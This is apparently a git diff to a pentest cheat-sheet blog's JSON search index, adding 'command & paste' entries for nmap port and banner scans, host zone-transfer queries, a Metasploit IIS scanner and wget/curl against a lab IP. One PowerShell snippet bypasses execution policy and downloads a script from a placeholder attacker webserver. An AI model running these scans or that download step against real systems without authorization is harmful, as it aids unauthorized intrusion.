@@ -42,7 +42,7 @@
 
 
 
-    "snippet": "Recon: nmap host discovery:nmap -Pn 10.10.10.50 # -Pn force nmap to scan ports even if the host seems to be down.nmap -Pn -p443 10.10.10.50 # -p force nmap to scan ports even if filtered is in place.nmap -Pn -sV -p80 10.10.10.50 # -sV force nmap to discovery the service versioning grabbing the banner.nmap 10.10.10.0/20 --open # -open force nmap to only show open (or possibly open) portsCheck out the nmap GUI version of the Nmap tool with ability to store scan data into the database, plot the network diagram based on the scan result such as services, hostname, etc.."
+    "snippet": "Recon: nmap host discovery:nmap -Pn 10.10.10.50 # -Pn force nmap to scan ports even if the host seems to be down.nmap -Pn -p443 10.10.10.50 # -p force nmap to scan ports even if filtered is in place.nmap -Pn -sV -p80 10.10.10.50 # -sV force nmap to discovery the service versioning grabbing the banner.nmap 10.10.10.0/20 --open # -open force nmap to only show open (or possibly open) portsnmap -sV -script banner 10.10.10.50 # -open force nmap to only show open (or possibly open) portsCheck out the nmap GUI version of the Nmap tool with ability to store scan data into the database, plot the network diagram based on the scan result such as services, hostname, etc.."
   },
   
   {
@@ -181,6 +181,36 @@
   },
   
   {
+    "title": "host command &amp; paste",
+    "url": "/posts/host/",
+    "categories": "command&paste",
+    "tags": "discovery, host, dns, reconnaissance",
+    "date": "2022-03-14 04:00:00 +0100",
+    
+
+
+
+
+
+    "snippet": "Run Nmap scripts to enumerate the Windows target machine IIS service.host domain_name #host ns domain_name #host -l domain_name ns_of_the_domain_name  #host  #"
+  },
+  
+  {
+    "title": "metasploit iis command &amp; paste",
+    "url": "/posts/metasploit-iis/",
+    "categories": "command&paste",
+    "tags": "metasploit, iis",
+    "date": "2022-03-12 23:00:00 +0100",
+    
+
+
+
+
+
+    "snippet": "#msfconsole -qmsf&amp;gt; use auxiliary/scanner/http/http_versionmsf&amp;gt; set RHOSTS 10.10.10.50msf&amp;gt; exploit"
+  },
+  
+  {
     "title": "Welcome to CSS",
     "url": "/posts/welcome-to-css/",
     "categories": "blog",
@@ -207,7 +237,7 @@
 
 
 
-    "snippet": "The penetration testing framework:curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &amp;gt; msfinstall &amp;amp;&amp;amp; \\  chmod 755 msfinstall &amp;amp;&amp;amp; \\  ./msfinstall;Home of the msploit"
+    "snippet": "The penetration testing framework:#curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &amp;gt; msfinstall &amp;amp;&amp;amp; \\  chmod 755 msfinstall &amp;amp;&amp;amp; \\  ./msfinstall;msf&amp;gt;msfconsole -q;msf&amp;gt;search &quot;something&quot;Home of the msploit"
   },
   
   {
@@ -253,6 +283,51 @@
 
 
     "snippet": "To update Kali, first ensure that /etc/apt/sources.list is properly populated:# See https://www.kali.org/docs/general-use/kali-linux-sources-list-repositories/deb http://http.kali.org/kali kali-rolling main contrib non-free# Additional line for source packages# deb-src http://http.kali.org/kali kali-rolling main contrib non-freeSet Italian’s keyboard layout:setxkbmap -layout itkali@kali:~$ sudo apt updatekali@kali:~$kali@kali:~$ sudo apt full-upgrade -yHome of update-kali"
+  },
+  
+  {
+    "title": "wget command &amp; paste",
+    "url": "/posts/wget/",
+    "categories": "command&paste",
+    "tags": "wget, *nix",
+    "date": "2022-03-05 10:00:00 +0100",
+    
+
+
+
+
+
+    "snippet": "#wget http://10.10.10.50/"
+  },
+  
+  {
+    "title": "curl command &amp; paste",
+    "url": "/posts/curl/",
+    "categories": "command&paste",
+    "tags": "curl, *nix",
+    "date": "2022-03-05 10:00:00 +0100",
+    
+
+
+
+
+
+    "snippet": "#curl http://10.10.10.50/"
+  },
+  
+  {
+    "title": "power shell command &amp; paste",
+    "url": "/posts/powershell/",
+    "categories": "command&paste",
+    "tags": "ps, windows, powershell",
+    "date": "2022-03-02 10:00:00 +0100",
+    
+
+
+
+
+
+    "snippet": "Allow scripts to run within the scope of this PowerShell process:Set-ExecutionPolicy Bypass -Scope ProcessDownload a script from a webserver (eg. python3 -m http.server 8181):(New-Object Net.WebClient).DownloadString(&#39;http://&amp;lt;webserver&amp;gt;:8181/script.ps1&#39;) &amp;gt;.\\script.ps1Home of powershell"
   },
   
   {
